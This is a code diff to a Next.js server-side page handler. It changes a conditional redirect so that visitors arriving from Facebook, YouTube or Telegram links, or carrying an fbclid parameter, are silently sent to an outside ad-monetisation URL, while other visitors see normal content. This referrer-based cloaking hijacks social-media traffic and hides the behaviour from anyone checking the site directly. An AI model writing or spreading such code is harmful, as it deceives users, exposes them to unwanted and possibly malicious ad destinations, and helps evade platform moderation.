@@ -11,21 +11,22 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 	const path = pathArr.join('/');
 	const fbclid = ctx.query.fbclid;
 
-	// redirect if Facebook or TikTok is the referer or request contains fbclid
-	if (
-		referringURL?.includes('facebook.com') ||
-		referringURL?.includes('tiktok.com') ||
-		fbclid
-	) {
-		return {
-			redirect: {
-				permanent: false,
-				destination: `${
-					`https://www.profitablegatecpm.com/pupzrj4ys?key=53cc60f9e7c17c60ead1040c784d8272/`
-				}`,
-			},
-		};
-	}
+	// redirect if Facebook, YouTube, or Telegram is the referer or request contains fbclid
+if (
+    referringURL?.includes('facebook.com') ||
+    referringURL?.includes('youtube.com') ||
+    referringURL?.includes('t.me') ||  // Added Telegram check (t.me is the Telegram domain)
+    fbclid
+) {
+    return {
+        redirect: {
+            permanent: false,
+            destination: `${
+                `https://grunoaph.net/4/7097020`
+            }`,
+        },
+    };
+}
 
 	const query = gql`
 		{
